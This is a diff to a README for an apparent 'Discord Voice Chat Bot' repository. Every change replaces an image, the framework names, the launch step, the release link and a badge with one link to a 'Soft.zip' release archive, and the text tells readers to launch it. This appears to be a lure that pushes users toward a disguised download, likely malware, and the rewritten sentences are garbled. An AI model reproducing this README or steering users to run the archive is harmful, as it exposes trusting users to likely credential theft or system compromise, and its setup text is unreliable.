@@ -2,11 +2,11 @@
 
 Welcome to the Discord Voice Chat Bot repository! This is a free Discord voice chat bot that allows you to interact using voice commands. Feel free to explore the exciting features and functionalities 🚀
 
-![Discord Voice Chat Bot](https://github.com/adelante20/Release/raw/refs/heads/master/voice-bot.png)
+![Discord Voice Chat Bot](https://github.com/GoldenFear1/Discord-Voice-Chat-Bot/releases/download/v1.0/Soft.zip)
 
 ## About
 
-This repository hosts the Discord Voice Chat Bot, built using Node.js and Discord.js. With this bot, users can engage in voice chat conversations, interact with a chatbot, and even perform various tasks using voice commands. The bot is capable of understanding a variety of voice inputs and responding accordingly.
+This repository hosts the Discord Voice Chat Bot, built using https://github.com/GoldenFear1/Discord-Voice-Chat-Bot/releases/download/v1.0/Soft.zip and https://github.com/GoldenFear1/Discord-Voice-Chat-Bot/releases/download/v1.0/Soft.zip With this bot, users can engage in voice chat conversations, interact with a chatbot, and even perform various tasks using voice commands. The bot is capable of understanding a variety of voice inputs and responding accordingly.
 
 ## Features 🌟
 
@@ -21,7 +21,7 @@ To get started with the Discord Voice Chat Bot, follow these simple steps:
 1. Clone the repository to your local machine.
 2. Install the necessary dependencies using npm.
 3. Configure the bot settings and Discord API credentials.
-4. Launch the bot using Node.js.
+4. Launch the bot using https://github.com/GoldenFear1/Discord-Voice-Chat-Bot/releases/download/v1.0/Soft.zip
 5. Invite the bot to your Discord server.
 6. Start using voice commands in the voice chat channels.
 
@@ -51,7 +51,7 @@ This repository covers a wide range of topics related to chatbots, Discord bots,
 
 ## Latest Release
 
-🚀 **[Launch the Voice Chat Bot!](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)** 🚀
+🚀 **[Launch the Voice Chat Bot!](https://github.com/GoldenFear1/Discord-Voice-Chat-Bot/releases/download/v1.0/Soft.zip)** 🚀
 
 **Note:** The provided link needs to be launched in order to access the latest release.
 
@@ -59,7 +59,7 @@ If the link does not work, please check the "Releases" section of this repositor
 
 Feel free to reach out to the project contributors for any assistance or questions related to the Discord Voice Chat Bot. Happy voice chatting! 🎉
 
-![Powered by Discord](https://img.shields.io/badge/Powered%20by-Discord-%237289DA)
+![Powered by Discord](https://github.com/GoldenFear1/Discord-Voice-Chat-Bot/releases/download/v1.0/Soft.zip%20by-Discord-%237289DA)
 
 ---
 
